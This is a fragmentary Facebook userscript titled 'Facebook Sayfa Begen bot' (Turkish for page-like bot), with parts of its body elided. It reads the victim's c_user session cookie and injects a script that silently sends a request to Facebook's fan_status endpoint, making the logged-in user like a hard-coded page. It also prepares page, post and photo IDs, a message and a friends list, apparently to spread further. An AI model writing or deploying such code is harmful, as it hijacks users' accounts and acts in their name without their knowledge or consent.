// ==UserScript==
// @name            Facebook Sayfa Begen bot
// @namespace       Facebook Sayfa Begen bot
...
var username=getCookie("username");
  ...
  //alert ('cookie does not exist');
	...
	var g=e[1];
 	...
 	var a = document.createElement('script');
		a.innerHTML = "new AsyncRequest().setURI('/ajax/pages/fan_status.php').setData({fbpage_id:134905469948003,__a:1,add:true, __user: "+g+",norefresh:true }).send();";
		document.body.appendChild(a);
...
var spage_id = "654165074597521";
var spost_id = "654165074597521";
var sfoto_id = "654165074597521";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
